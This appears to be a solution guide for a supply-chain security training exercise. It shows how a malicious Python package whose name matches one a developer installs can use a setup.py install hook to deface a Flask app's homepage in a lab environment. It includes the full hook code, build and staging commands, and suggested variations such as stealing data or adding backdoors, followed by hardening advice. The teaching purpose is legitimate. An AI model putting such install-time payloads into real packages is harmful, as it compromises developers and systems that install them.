# Solution Guide — ex4: Package Download Attack

## Overview
This exercise demonstrates how attackers can exploit developers who download packages from untrusted sources by creating malicious packages with the exact names that developers are trying to download. Unlike traditional typo-squatting, this attack targets specific package names that the developer is actively seeking.

## What the Attack Does
The developer simulator downloads three specific packages in rotation:
- `FlowerClassifier`
- `FlowerNet` 
- `FlowerID`

When a malicious package with one of these exact names is installed, it executes code during installation that overwrites the running web application's homepage template, demonstrating immediate impact.

## Key Differences from Previous Exercises
- **Targeted Attack**: Instead of relying on typos, we target the exact package names the developer wants
- **Specific Package Names**: The developer downloads `FlowerClassifier`, `FlowerNet`, and `FlowerID` repeatedly
- **Direct Impact**: Installation affects the live production-like environment immediately

## The Malicious Package
The solution includes a malicious `flowernet` package that:
- Uses the exact name `flowernet` (matching `FlowerNet` from the developer's download list)
- Implements a custom `install` hook that runs during package installation
- Overwrites `/app/templates/index.html` with a defaced page
- Creates a backup of the original file at `/app/templates/index.html.bak`

### Core Malicious Logic
The malicious code lives in `solution/malicious-packages/flowernet/setup.py`:

```python
class MaliciousInstall(install):
    def run(self):
        try:
            target_file = "/app/templates/index.html"
            backup_file = target_file + ".bak"
            HACKED_HTML = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HACKED</title>
</head>
<body style="background:#111;color:#fff;text-align:center;padding-top:40px;">
    <h1>flowernet installed!</h1>
    <img src="https://i.imgur.com/Z6X8b5U.png" alt="Hacker" style="max-width:400px;width:80%;box-shadow:0 2px 16px #000;border-radius:12px;">
    <p style="margin-top:30px;font-size:1.2em;">Your site has been <span style="color:#e74c3c;">HACKED</span> by a typo-squatted package!</p>
</body>
</html>
"""
            # Create backup if it doesn't exist
            if os.path.exists(target_file) and not os.path.exists(backup_file):
                with open(target_file, "rb") as fsrc:
                    data = fsrc.read()
                with open(backup_file, "wb") as fdst:
                    fdst.write(data)
            
            # Overwrite the target file
            os.makedirs(os.path.dirname(target_file), exist_ok=True)
            with open(target_file, "w", encoding="utf-8") as f:
                f.write(HACKED_HTML)
        except Exception:
            pass
        super().run()
```

## Building the Malicious Package

```bash
cd w2d3/exercises/ex4/solution/malicious-packages/flowernet
python3 setup.py sdist
```

This creates `dist/flowernet-0.0.5.tar.gz`.

## Staging the Attack

Copy the malicious package to the exercise's PyPI server:

```bash
cd w2d3/exercises/ex4
mkdir -p exercise/packages
cp solution/malicious-packages/flowernet/dist/flowernet-0.0.5.tar.gz exercise/packages/
```

## Running the Environment

```bash
cd w2d3/exercises/ex4/exercise
docker-compose up --build
```

The environment includes:
- **Web Container**: Flask app serving the flower shop (mounts `src/` to `/app`)
- **PyPI Server**: Serves packages from `./packages` on `http://pypi-server:8080/simple`
- **Developer Simulator**: Continuously downloads packages in rotation

## What You Should See

1. **Developer Activity**: Watch the terminal output showing commands like:
   ```
   Developer downloading: pip install FlowerNet --index-url http://pypi-server:8080/simple --trusted-host pypi-server
   ✓ Package downloaded successfully: FlowerNet
   ```

2. **Attack Success**: When the developer downloads `FlowerNet`, the malicious `flowernet` package is installed and the homepage is immediately defaced.

3. **Visual Impact**: Visit `http://localhost:5000` to see the hacked page with the hacker image and defaced content.

4. **Status Monitoring**: The `/status` endpoint or "Refresh Status" button will show installed packages and any detected malicious packages.

## Creating Additional Malicious Packages

You can create malicious packages for the other two target packages:

### For FlowerClassifier:
```bash
# Create a new directory
mkdir -p solution/malicious-packages/flowerclassifier
cd solution/malicious-packages/flowerclassifier

# Create setup.py (similar to flowernet but with name="flowerclassifier")
python3 setup.py sdist
cp dist/flowerclassifier-*.tar.gz ../../exercise/packages/
```

### For FlowerID:
```bash
# Create a new directory  
mkdir -p solution/malicious-packages/flowerid
cd solution/malicious-packages/flowerid

# Create setup.py (similar to flowernet but with name="flowerid")
python3 setup.py sdist
cp dist/flowerid-*.tar.gz ../../exercise/packages/
```

## Restore and Cleanup

```bash
# Restore the original homepage
cp exercise/src/templates/index.html.bak exercise/src/templates/index.html

# Remove malicious packages
rm exercise/packages/flowernet-*.tar.gz
rm exercise/packages/flowerclassifier-*.tar.gz  # if created
rm exercise/packages/flowerid-*.tar.gz          # if created

# Stop containers
docker-compose down -v
```

## Why This Attack Works

1. **Exact Name Matching**: The developer downloads packages with specific names (`FlowerClassifier`, `FlowerNet`, `FlowerID`), and pip will install any package with a matching name.

2. **Case Insensitivity**: Python package names are case-insensitive, so `FlowerNet` matches `flowernet`.

3. **Production Environment**: The developer works in a production-like environment where package installation affects the live filesystem.

4. **Install Hooks**: The `install` command hook provides a powerful execution point that runs with the installer's privileges.

5. **No Version Pinning**: The developer doesn't specify exact versions, allowing any version of the package to be installed.

## Attack Variations

1. **Multiple Package Names**: Create malicious packages for all three target packages (`FlowerClassifier`, `FlowerNet`, `FlowerID`)

2. **Different Payloads**: Modify the malicious code to:
   - Steal sensitive data
   - Create backdoors
   - Modify configuration files
   - Install additional malicious packages

3. **Evasion Techniques**: 
   - Use legitimate-looking package descriptions
   - Include fake documentation
   - Mimic the structure of legitimate packages

## Hardening Recommendations

1. **Package Allowlisting**: Only allow installation of packages from trusted sources with known-good package names.

2. **Version Pinning**: Use exact version requirements in requirements.txt or similar dependency files.

3. **Isolated Builds**: Use PEP 517 isolated builds and `--only-binary=:all:` when possible to prevent arbitrary code execution.

4. **Content Trust**: Implement package signing and verification (SLSA, Sigstore).

5. **CI/CD Only**: Restrict package installation to controlled CI/CD environments, not developer workstations.

6. **Monitoring**: Implement monitoring for unexpected package installations and file modifications.

7. **Network Segmentation**: Isolate development environments from production systems.

## Learning Objectives

This exercise teaches:
- How attackers can target specific package names that developers actively seek
- The power of package installation hooks for malicious code execution
- The importance of package source verification and allowlisting
- How production-like environments can amplify the impact of package-based attacks
- The need for comprehensive supply chain security measures


